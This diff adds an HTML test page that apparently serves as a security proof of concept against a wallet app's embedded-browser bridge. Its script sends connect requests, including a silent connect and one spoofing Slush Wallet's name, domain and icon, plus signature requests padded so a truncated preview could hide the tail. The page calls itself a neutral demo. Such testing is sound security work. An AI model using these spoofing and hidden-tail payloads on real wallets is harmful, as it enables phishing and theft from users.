@@ -1,0 +1,75 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Acme Labs Demo dApp</title>
+<style>
+  body { font-family: -apple-system, system-ui, sans-serif; margin: 16px; background:#0f1117; color:#e8e8ee; }
+  h1 { font-size: 20px; }
+  p  { color:#b8b8c6; font-size: 14px; }
+  #log { background:#181b24; color:#9fe0a0; padding:10px; border-radius:8px; font-size:11px;
+         white-space:pre-wrap; word-break:break-all; min-height:120px; }
+  .tag { display:inline-block; padding:2px 8px; border-radius:10px; background:#24304a; font-size:12px; }
+</style>
+</head>
+<body>
+<h1>Acme Labs Demo dApp</h1>
+<p><span class="tag">neutral demo page</span> This page demonstrates page-to-wallet messaging inside a
+host application's embedded browser. Nothing here is a real dApp.</p>
+<pre id="log"></pre>
+<script>
+(function () {
+  var host = document.getElementById('log');
+  function log(m) { host.textContent += m + "\n"; }
+  window.addEventListener('error', function (e) { log('ERR ' + e.message); });
+  log('origin=' + location.origin);
+  log('bridge=' + (!!(window.ReactNativeWebView && window.ReactNativeWebView.postMessage)));
+  var seq = 1;
+  function emit(path, method, input) {
+    var id = seq++;
+    var payload = { eventName: '@trpc/request', data: { id: id, method: method, params: { path: path, input: input } } };
+    log('EMIT ' + JSON.stringify(payload));
+    window.ReactNativeWebView.postMessage(JSON.stringify(payload));
+  }
+  window.addEventListener('message', function (e) {
+    try { log('RESP ' + JSON.stringify(JSON.parse(e.data))); }
+    catch (err) { log('RAW ' + String(e.data).slice(0, 300)); }
+  });
+  var step = new URLSearchParams(location.search).get('step') || 'none';
+  log('step=' + step);
+  setTimeout(function () {
+    if (step === 'connect') {
+      emit('connect', 'query', { silent: false });
+    } else if (step === 'silent') {
+      emit('connect', 'query', { silent: true });
+    } else if (step === 'spoof') {
+      emit('connect', 'query', {
+        silent: false,
+        appName: 'Slush Wallet',
+        appDomain: 'slush.app',
+        appURL: 'https://slush.app',
+        appIconURL: 'https://slush.app/icon.png',
+        title: 'Slush Wallet',
+        url: 'https://slush.app',
+        origin: 'https://slush.app',
+        dappName: 'Slush Wallet',
+        dappUrl: 'https://slush.app',
+        host: 'slush.app'
+      });
+    } else if (step === 'sign') {
+      emit('signPersonalMessage', 'mutation', {
+        message: btoa('OSA-PoC-signature-request'),
+        account: { address: new URLSearchParams(location.search).get('addr') || '' }
+      });
+    } else if (step === 'signlong') {
+      emit('signPersonalMessage', 'mutation', {
+        message: btoa('Please sign in to continue. This message is long enough that a truncated preview could hide the tail. OSA-TAIL-MARKER-9f3c'),
+        account: { address: new URLSearchParams(location.search).get('addr') || '' }
+      });
+    }
+  }, 900);
+})();
+</script>
+</body>
+</html>
